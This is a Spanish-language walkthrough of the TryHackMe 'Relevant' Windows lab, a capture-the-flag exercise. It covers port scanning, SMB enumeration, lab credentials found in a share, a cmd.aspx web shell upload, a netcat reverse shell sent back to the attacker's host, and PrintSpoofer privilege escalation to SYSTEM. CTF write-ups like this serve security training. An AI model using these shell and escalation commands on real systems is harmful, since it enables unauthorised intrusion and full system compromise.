---
layout: post
title:  "Relevant - TryHackMe"
date:   2021-05-14 7:21:00 +0200
last_modified_at: 2021-05-14 07:21:29 +0200
toc:  true
tags: [ctf, windows, Tryhackme, Walkthrough, SeImpersonatePrivilege]
---

{: .message}

Es una maquina windows interesante en la parte inicial y en la escalada que puede presentar un reto.
## Enumeracion
*Puertos:*
```plaintext
80/tcp   --> Microsoft IIS httpd 10.0
135/tcp  --> Microsoft Windows RPC
139/tcp  --> Microsoft Windows netbios-ssn
445/tcp  --> Windows Server 2016 Standard Evaluation 14393 
3389/tcp --> Microsoft Terminal Services
```
### Nmap
*Para escanear todos los puertos rapido:*
```bash
nmap -p- -sT --min-rate 5000  10.10.89.170 -oG Scanport1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 20:26 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.97% done; ETC: 20:27 (0:00:40 remaining)
Nmap scan report for 10.10.89.170
Host is up (0.15s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds
```

*Escaneo mas exhaustivo:*

```bash
# Nmap 7.91 scan initiated Thu May 13 20:35:05 2021 as: nmap -sC -sV -p80,135,139,445,3389 -oN Scanport2 10.10.89.170
Nmap scan report for 10.10.89.170
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-13T23:35:20+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-05-12T23:22:38
|_Not valid after:  2021-11-11T23:22:38
|_ssl-date: 2021-05-13T23:36:01+00:00; -59m59s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 24m00s, deviation: 3h07m50s, median: -59m59s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-13T16:35:20-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-13T23:35:21
|_  start_date: 2021-05-13T23:23:14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 13 20:36:01 2021 -- 1 IP address (1 host up) scanned in 56.40 seconds
```

### Masscan

*Aqui hago uso de otra utilidad para confirmar lo que tengo y descartar falsos positivos:*

```bash
masscan -e tun0 --rate=500 -p 0-65535 10.10.173.246
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-05-14 21:58:30 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 445/tcp on 10.10.173.246                                  
Discovered open port 3389/tcp on 10.10.173.246                                 
Discovered open port 49667/tcp on 10.10.173.246
Discovered open port 49663/tcp on 10.10.173.246
```

### SMB enumeration

Carpeta compatida de interes: *nt4wrksv*

```json
smbmap -H 10.10.89.170 -u benji -p benji                                                 3s
[+] Guest session       IP: 10.10.89.170:445    Name: Relevant                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE
```

### Credentials

Estas fueron obtenidas de la carpeta compartida nt4wrksv

```plaintext
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

## SMB upload cmd.aspx

La idea es que si te metes por la web: http://ip:49663/nt4wrksv/passwords.txt puedes visualizar los archivos que se encuentra en el smb. Entonces teniendo esto claro la idea es subir una cmd.aspx. (Primero probe con la cmd.asp pero esta no me dio resultado y luego pase a la cmd.aspx)

Vemos como se nos muestra una cmd:
http://ip:49663/nt4wrksv/cmd.aspx 

## Shell inicial

Corremos un servidor de smb y luego tiramos de un archivo compartido que es nc.exe y nos lazamos una reverse:

```bash
\\10.9.206.201\share\nc.exe 10.9.206.201 4444 -e cmd.exe
```

```bash
listening on [any] 4444 ...
connect to [10.9.206.201] from (UNKNOWN) [10.10.173.246] 49887
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```


## PrivEsc

El primer comando siempre debe ser ```whoami /priv``` para saber los permisos que posee ese usuario:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Aqui resalta el famoso SeImpersonatePrivilege, para la explotacion de dicho privilegio se hace tirando de este [binario](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

Ejecutamos el binario desde el directorio de bob:

```bash
\\10.9.206.201\share\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\system32>
```

MACHINE PWNED!!!!!